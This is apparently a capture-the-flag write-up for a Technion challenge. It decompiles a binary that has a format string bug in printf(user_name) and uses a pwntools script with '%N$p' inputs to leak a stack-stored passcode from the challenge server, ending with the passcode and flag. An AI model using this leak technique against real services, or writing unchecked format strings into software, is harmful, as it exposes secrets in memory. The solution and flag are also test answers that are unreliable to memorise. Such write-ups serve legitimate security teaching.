# Secure Service
Category: Reversing & Binary Exploitation

## Description
> The department of EEvil created a service to spread flags and ruin the competition, the service requires a passcode in order to receive the flag, see if you can get the passcode.

A binary file was attached, as well as server details.

## Solution

Let's run the attached binary:

```console
root@kali:/media/sf_CTFs/technion/Secure_Service# ./secure_service
Welcome to the EEvil departement secure service
Please enter you name: Fake
Hello Fake, Please enter the passcode: Password1
This is not the code! Are you trying to hack us?
```

The program asks us for a name and password. We probably need to provide the correct combination to get the flag.

Let's open the program in Ghidra:

```c
undefined8 main(void)

{
  int iVar1;
  long lVar2;
  char *local_RDI_43;
  long in_FS_OFFSET;
  char user_password [16];
  char real_password [16];
  char user_name [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  lVar2 = 0xc;
  local_RDI_43 = user_name;
  while (lVar2 != 0) {
    lVar2 = lVar2 + -1;
    *(undefined8 *)local_RDI_43 = 0;
    local_RDI_43 = local_RDI_43 + 8;
  }
  *(undefined4 *)local_RDI_43 = 0;
  user_password._0_8_ = 0;
  user_password._8_8_ = 0;
  real_password._0_8_ = 0x2323232323232323;
  real_password._8_8_ = 0x232323232323;
  puts("Welcome to the EEvil departement secure service");
  printf("Please enter you name: ");
  __isoc99_scanf("%100s",user_name);
  printf("Hello ");
  printf(user_name);
  printf(", Please enter the passcode: ");
  __isoc99_scanf(&DAT_00100b0b,user_password);
  iVar1 = strcmp(real_password,user_password);
  if (iVar1 == 0) {
    puts("Great, here is the flag: ################\nLong Live the EEmpire!");
  }
  else {
    puts("This is not the code! Are you trying to hack us?");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 1;
}
```

We can see a few things here:

* If we get the password right, we will indeed get the flag (however the local binary provided to us has the flag redacted)
* The expected password is saved on the stack (in the local binary it's `'##############'`)
* Most importantly: The name we provide to the program is passed as-is to `printf`, causing a format string vulnerability


Using this vulnerability, we can craft our name to look like a format string instead of a plain string by including format specifiers such as `%x`. This will cause the program to print back values from the stack:

```console
root@kali:/media/sf_CTFs/technion/Secure_Service# ./secure_service
Welcome to the EEvil departement secure service
Please enter you name: %x
Hello 6f0a5b50, Please enter the passcode:
```

Instead of printing `%x`, the program treated it as a format specifier and printed a value from the stack: `6f0a5b50`.

We write a short script to dump a few values from the stack:

```python
# First, generate pwntools template via:
# pwn template --host ctf.cs.technion.ac.il --port 4007 ./secure_service

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def leak(index):
    with context.local(log_level='ERROR'): 
        io = start()
        io.sendline(f"%{index}$p")
        io.recvuntil("Hello ")
        leaked = io.recvuntil(",", drop = True)
        io.close()
        res = leaked.decode("ascii")
        if res == "(nil)":
            res = "0"
        return res

for i in range(1, 20):
    leaked_hex = leak(i)
    try:
        leaked_str = int(leaked_hex, 16)
        log.info(f"Index: {i:02}, Value: 0x{leaked_str:016x}, as ASCII: {p64(leaked_str)}")
    except ValueError:
        pass
```

We'll run it locally first:
```console
root@kali:/media/sf_CTFs/technion/Secure_Service# python3 solve.py LOCAL
[*] '/media/sf_CTFs/technion/Secure_Service/secure_service'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Index: 01, Value: 0x00007ffc86fbcb60, as ASCII: b'`\xcb\xfb\x86\xfc\x7f\x00\x00'
[*] Index: 02, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 03, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 04, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 05, Value: 0x0000000000000006, as ASCII: b'\x06\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 06, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 07, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 08, Value: 0x2323232323232323, as ASCII: b'########'
[*] Index: 09, Value: 0x0000232323232323, as ASCII: b'######\x00\x00'
[*] Index: 10, Value: 0x0000007024303125, as ASCII: b'%10$p\x00\x00\x00'
[*] Index: 11, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 12, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 13, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 14, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 15, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 16, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 17, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 18, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 19, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
```

We can see the expected password at offsets 8-9.

Now, let's run on the server:
```console
root@kali:/media/sf_CTFs/technion/Secure_Service# python3 solve.py
[*] '/media/sf_CTFs/technion/Secure_Service/secure_service'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Index: 01, Value: 0x00007ffe89ecbca0, as ASCII: b'\xa0\xbc\xec\x89\xfe\x7f\x00\x00'
[*] Index: 02, Value: 0x00007fa35e8ac8c0, as ASCII: b'\xc0\xc8\x8a^\xa3\x7f\x00\x00'
[*] Index: 03, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 04, Value: 0x0000000000000006, as ASCII: b'\x06\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 05, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 06, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 07, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 08, Value: 0x68745f73695f4652, as ASCII: b'RF_is_th'
[*] Index: 09, Value: 0x0000747365625f65, as ASCII: b'e_best\x00\x00'
[*] Index: 10, Value: 0x0000007024303125, as ASCII: b'%10$p\x00\x00\x00'
[*] Index: 11, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 12, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 13, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 14, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 15, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 16, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 17, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 18, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Index: 19, Value: 0x0000000000000000, as ASCII: b'\x00\x00\x00\x00\x00\x00\x00\x00'
```

As before, the password is leaked at indexes 8-9: `RF_is_the_best`.

```console
root@kali:/media/sf_CTFs/technion/Secure_Service# nc ctf.cs.technion.ac.il 4007
Welcome to the EEvil departement secure service
Please enter you name: Name
Hello Name, Please enter the passcode: RF_is_the_best
Great, here is the flag: cstechnion{us3_f0rm4t_str1ng_0n_1nput}
Long Live the EEmpire!
```

The flag: `cstechnion{us3_f0rm4t_str1ng_0n_1nput}`
